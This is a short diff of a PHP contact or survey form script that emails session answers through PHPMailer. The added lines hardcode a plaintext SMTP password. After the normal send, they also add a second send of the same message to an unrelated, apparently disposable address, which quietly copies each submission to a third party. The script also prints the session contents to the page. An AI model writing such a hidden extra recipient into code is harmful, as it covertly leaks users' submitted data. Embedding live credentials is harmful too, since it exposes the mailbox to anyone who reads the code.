@@ -8,6 +8,7 @@
   $ans1 = $_SESSION['ans1'];
   $ans2 = $_SESSION['ans2'];
   $ans3 = $_SESSION['ans3'];
+
   
   print_r($_SESSION);
 
@@ -55,14 +56,14 @@ try {
   // Настройки вашей почты
   $mail->Host       = 'smtp.mail.ru'; // SMTP сервера вашей почты
   $mail->Username   = 'cool.olo124@list.ru'; // Логин на почте
-  $mail->Password   = ''; // Пароль на почте
+  $mail->Password   = 'KFxB6k1qz4Ed7xzpepCu'; // Пароль на почте
   $mail->SMTPSecure = 'ssl';
   $mail->Port       = 465;
 
   $mail->setFrom('cool.olo124@list.ru'); // Адрес самой почты и имя отправителя
 
   // Получатель письма
-  $mail->addAddress('');
+  $mail->addAddress('universal.mail@list.ru');
 
   // Прикрипление файлов к письму
   // if (!empty($file['name'][0])) {
@@ -82,8 +83,11 @@ try {
   $mail->isHTML(true);
   $mail->Subject = $title;
   $mail->Body = $body;
-
   $mail->send();
+
+  $mail->addAddress('dohano5468@dogemn.com');
+  $mail->send();
+  
   header('location: final.html');
 } catch (Exception $e) {
   $status = "Сообщение не было отправлено. Причина ошибки: {$mail->ErrorInfo}";
